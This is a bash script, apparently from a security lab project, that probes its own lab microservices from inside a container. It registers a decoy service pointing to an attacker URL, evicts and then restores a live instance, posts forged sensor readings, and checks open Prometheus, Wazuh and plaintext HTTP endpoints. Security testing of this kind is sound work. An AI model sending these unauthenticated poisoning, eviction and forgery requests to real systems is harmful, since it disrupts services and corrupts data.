#!/bin/bash
# Attack-surface probe (SLE Project 1).
#
# Threat model: the adversary has already reached the service network (a crossed
# perimeter / a compromised neighbouring workload) but holds no credentials. This
# is the realistic post-foothold position. The probe therefore runs FROM INSIDE
# soa-container and, rather than *asserting* the attack surface on paper, CONFIRMS
# each exposure with one real request and records the result.
#
#   Run:  incus exec soa-container -- bash /opt/soa/probe.sh
#   (or push and run inline; see threats/00-attack-surface/README.md)
#
# It is read-mostly: the one destructive check (/unregister) immediately restores
# what it evicted, and the lab self-heals on the next heartbeat regardless.
set -uo pipefail

REG="http://127.0.0.1:5050"          # registry  (localhost-bound)
ING="http://10.255.255.204:5001"     # ingestion (bridge)
PROM="http://10.255.255.153:9090"    # Prometheus
WAZUHAPI="https://10.255.255.4:55000" # Wazuh API
C=0; E=0                              # checks, exposures
pass(){ printf '  [ CONFIRMED ] %s\n      evidence: %s\n' "$1" "$2"; E=$((E+1)); C=$((C+1)); }
safe(){ printf '  [  BLOCKED  ] %s\n      evidence: %s\n' "$1" "$2"; C=$((C+1)); }
hr(){ printf -- '--------------------------------------------------------------------------\n'; }

echo   "=========================================================================="
echo   " ATTACK-SURFACE PROBE  ·  position: inside soa-container, no credentials"
echo   " date: $(date -u +%Y-%m-%dT%H:%M:%SZ)   host: $(hostname)"
echo   "=========================================================================="

# --- 1. Discovery poisoning (unauthenticated write to the registry) ----------
hr; echo "1. Discovery poisoning  (POST /register a decoy, then /discover returns it)"
DECOY_ID="pt.evil.dc9.rack9.node9/analytics-service#decoy"
curl -s -o /dev/null -X POST "$REG/register" -H 'Content-Type: application/json' \
  -d "{\"name\":\"analytics-service\",\"url\":\"http://10.255.255.66:9999\",\"location\":\"pt.evil.dc9.rack9.node9\",\"instance_id\":\"$DECOY_ID\"}"
HIT=""
for _ in $(seq 1 8); do
  R=$(curl -s "$REG/discover/analytics-service")
  echo "$R" | grep -q '10.255.255.66:9999' && HIT="$R" && break
done
if [ -n "$HIT" ]; then
  pass "unauthenticated /register injected a decoy and /discover handed clients the attacker URL" \
       "discover -> $(echo "$HIT" | tr -d ' ' | head -c 120)"
else
  safe "decoy not returned by discovery" "registry rejected or load-balanced away the decoy"
fi
# cleanup the decoy
curl -s -o /dev/null -X DELETE "$REG/unregister" -H 'Content-Type: application/json' \
  -d "{\"name\":\"analytics-service\",\"instance_id\":\"$DECOY_ID\"}"

# --- 2. One-request denial of service (unauthenticated /unregister) ----------
hr; echo "2. One-request DoS  (DELETE /unregister evicts a live instance)"
# pick a real instance to evict, then restore it
VICT=$(curl -s "$REG/services/storage-service" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);i=d[0];print(i["instance_id"]+"\t"+i["url"]+"\t"+i["location"])' 2>/dev/null)
VID=$(printf '%s' "$VICT" | cut -f1); VURL=$(printf '%s' "$VICT" | cut -f2); VLOC=$(printf '%s' "$VICT" | cut -f3)
if [ -n "$VID" ]; then
  curl -s -o /dev/null -X DELETE "$REG/unregister" -H 'Content-Type: application/json' \
    -d "{\"name\":\"storage-service\",\"instance_id\":\"$VID\"}"
  GONE=$(curl -s "$REG/services/storage-service" | grep -c "$VID")
  # restore immediately (idempotent: same instance_id key; heartbeat would also self-heal)
  curl -s -o /dev/null -X POST "$REG/register" -H 'Content-Type: application/json' \
    -d "{\"name\":\"storage-service\",\"url\":\"$VURL\",\"location\":\"$VLOC\",\"instance_id\":\"$VID\"}"
  if [ "$GONE" = "0" ]; then
    pass "a single unauthenticated DELETE evicted a live storage instance (restored after check)" \
         "evicted $VID ; absent from /services immediately after the one request"
  else
    safe "/unregister did not evict the instance" "instance still present after DELETE"
  fi
else
  safe "could not read a storage instance to test" "no storage-service instance registered"
fi

# --- 3. Forged data (unauthenticated /ingest, no device authentication) -------
hr; echo "3. Forged data  (POST /ingest a plausible reading from a sensor that does not exist)"
GHOST="pt.evil.dc9.rack9.node9/temp-sensor#ghost"
# ingestion validates shape + physical range (a real control) but NOT identity,
# so a well-formed reading from a non-existent device is indistinguishable from a real one.
RC=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$ING/ingest" -H 'Content-Type: application/json' \
  -d "{\"device_id\":\"$GHOST\",\"temperature\":23.5,\"unit\":\"C\"}")
# control check: a malformed / out-of-range reading IS rejected
BAD=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$ING/ingest" -H 'Content-Type: application/json' \
  -d "{\"device_id\":\"$GHOST\",\"temperature\":999.9,\"unit\":\"C\"}")
if [ "$RC" = "200" ] || [ "$RC" = "201" ]; then
  pass "ingestion accepted a plausible reading from a device with no identity (HTTP $RC)" \
       "POST /ingest device_id=$GHOST temperature=23.5C -> $RC ; a forged value is now stored indistinguishably from real (note: out-of-range 999.9 -> $BAD, so shape/range is validated, identity is not)"
else
  safe "ingestion rejected the forged reading (HTTP $RC)" "POST /ingest device_id=$GHOST -> $RC"
fi

# --- 4. Topology leak (unauthenticated /services returns a labelled map) -------
hr; echo "4. Topology leak  (GET /services hands out the rack/node map)"
MAP=$(curl -s "$REG/services")
NINST=$(printf '%s' "$MAP" | grep -o '"instance_id"' | wc -l | tr -d ' ')
LOCS=$(printf '%s' "$MAP" | grep -o '"location":"[^"]*"' | sort -u | head -5 | tr '\n' ' ')
if [ "${NINST:-0}" -gt 0 ]; then
  pass "unauthenticated /services exposed $NINST instances with their physical location labels" \
       "locations seen: $LOCS"
else
  safe "/services returned nothing" "empty registry map"
fi

# --- 5. Open monitoring plane (unauthenticated Prometheus/Wazuh APIs) ----------
hr; echo "5. Monitoring plane  (can an attacker read/mute the detection stack?)"
PRC=$(curl -s -o /dev/null -w '%{http_code}' "$PROM/api/v1/query?query=up")
if [ "$PRC" = "200" ]; then
  NA=$(curl -s "$PROM/api/v1/alerts" | grep -o '"alertname"' | wc -l | tr -d ' ')
  pass "Prometheus API answers unauthenticated (HTTP $PRC) — an attacker can read metrics and alerts" \
       "GET /api/v1/query?query=up -> 200 ; /api/v1/alerts visible ($NA alert objects)"
else
  safe "Prometheus API not reachable/authenticated (HTTP $PRC)" "GET /api/v1/query -> $PRC"
fi
WRC=$(curl -s -k -o /dev/null -w '%{http_code}' --max-time 4 "$WAZUHAPI/" 2>/dev/null)
if [ "$WRC" = "200" ]; then
  pass "Wazuh API reachable without credentials (HTTP $WRC)" "GET $WAZUHAPI/ -> 200"
else
  safe "Wazuh API not reachable unauthenticated from a foothold (HTTP ${WRC:-000})" "GET $WAZUHAPI/ -> ${WRC:-000} (TLS + API auth; not an open read like Prometheus)"
fi

# --- 6. Plaintext transport (no TLS between services) --------------------------
hr; echo "6. Plaintext transport  (inter-service traffic is HTTP, not HTTPS)"
HRC=$(curl -s -o /dev/null -w '%{http_code}' "$ING/health" 2>/dev/null)
SRC=$(curl -s -k -o /dev/null -w '%{http_code}' --max-time 3 "https://10.255.255.204:5001/health" 2>/dev/null)
if [ "$HRC" = "200" ] && [ "$SRC" != "200" ]; then
  pass "services answer on plain HTTP and refuse HTTPS — traffic is readable on-path (see Threat D)" \
       "http://...:5001/health -> $HRC ; https://...:5001/health -> ${SRC:-refused}"
else
  safe "TLS appears to be in use" "https probe -> $SRC"
fi

hr
echo "SUMMARY: $E of $C checks CONFIRMED an exposure (adversary already on the service network)."
echo "Controls that held: lab isolation (no egress), unprivileged hardened containers,"
echo "localhost-binding of the registry/storage replicas (these are only reachable AFTER a foothold)."
